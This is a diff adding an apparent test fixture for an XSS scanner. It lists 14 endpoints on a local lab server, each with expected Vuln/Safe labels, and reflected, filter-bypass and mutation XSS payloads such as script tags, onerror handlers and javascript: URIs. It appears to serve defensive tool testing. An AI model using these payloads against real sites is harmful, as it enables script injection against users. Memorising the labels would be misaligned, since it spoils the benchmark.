@@ -1,0 +1,297 @@
+{
+  "_meta": {
+    "category": "Multi-Type",
+    "description": "14 endpoints across reflected XSS, bypass techniques, and mutation XSS \u2014 11 vulnerable, 3 safe (verified via source code analysis)",
+    "target": "http://localhost:5050"
+  },
+  "endpoints": [
+    {
+      "name": "reflected-body",
+      "category": "Reflected",
+      "url": "http://localhost:5050/reflected/body",
+      "method": "GET",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "<script>alert(1)</script>",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        },
+        {
+          "payload": "<img src=x onerror=alert(1)>",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "reflected-script",
+      "category": "Reflected",
+      "url": "http://localhost:5050/reflected/script",
+      "method": "GET",
+      "params": [
+        "name"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "';alert(1)//",
+          "target_param": "name",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "reflected-attr-unquoted",
+      "category": "Reflected",
+      "url": "http://localhost:5050/reflected/attribute-unquoted",
+      "method": "GET",
+      "params": [
+        "color"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "x onfocus=alert(1) autofocus=x",
+          "target_param": "color",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "reflected-href",
+      "category": "Reflected",
+      "url": "http://localhost:5050/reflected/href",
+      "method": "GET",
+      "params": [
+        "url"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "javascript:alert(1)",
+          "target_param": "url",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "reflected-iframe",
+      "category": "Reflected",
+      "url": "http://localhost:5050/reflected/iframe",
+      "method": "GET",
+      "params": [
+        "src"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "javascript:alert(1)",
+          "target_param": "src",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "reflected-multiparams",
+      "category": "Reflected",
+      "url": "http://localhost:5050/reflected/multiparams",
+      "method": "GET",
+      "params": [
+        "a",
+        "b"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "<script>alert(1)</script>",
+          "target_param": "a",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "reflected-meta",
+      "category": "Reflected",
+      "url": "http://localhost:5050/reflected/meta",
+      "method": "GET",
+      "params": [
+        "redir"
+      ],
+      "expected": "Safe",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "javascript:alert(1)",
+          "target_param": "redir",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "bypass-double-encode",
+      "category": "Bypass",
+      "url": "http://localhost:5050/bypass/double-encode",
+      "method": "GET",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "%253Cscript%253Ealert(1)%253C/script%253E",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "bypass-quote-escape",
+      "category": "Bypass",
+      "url": "http://localhost:5050/bypass/quote-escape",
+      "method": "GET",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "<img src=x onerror=alert(1)>",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "bypass-blacklist",
+      "category": "Bypass",
+      "url": "http://localhost:5050/bypass/blacklist",
+      "method": "GET",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "<img src=x onerror=alert(1)>",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "bypass-case",
+      "category": "Bypass",
+      "url": "http://localhost:5050/bypass/case",
+      "method": "GET",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "<ScRiPt>alert(1)</ScRiPt>",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "bypass-angle-only",
+      "category": "Bypass",
+      "url": "http://localhost:5050/bypass/angle-only",
+      "method": "GET",
+      "params": [
+        "q"
+      ],
+      "expected": "Safe",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "\" autofocus onfocus=alert(1) id=\"",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "bypass-waf-sim",
+      "category": "Bypass",
+      "url": "http://localhost:5050/bypass/waf-sim",
+      "method": "GET",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "<script>fetch('/health')</script>",
+          "target_param": "q",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "name": "mutation-innerhtml",
+      "category": "Mutation",
+      "url": "http://localhost:5050/mutation/innerhtml",
+      "method": "GET",
+      "params": [
+        "html"
+      ],
+      "expected": "Safe",
+      "stored_mode": false,
+      "payloads": [
+        {
+          "payload": "<svg><g onload=alert(1)></g></svg>",
+          "target_param": "html",
+          "confidence": 1.0,
+          "technique": "original",
+          "severity": "medium"
+        }
+      ]
+    }
+  ]
+}
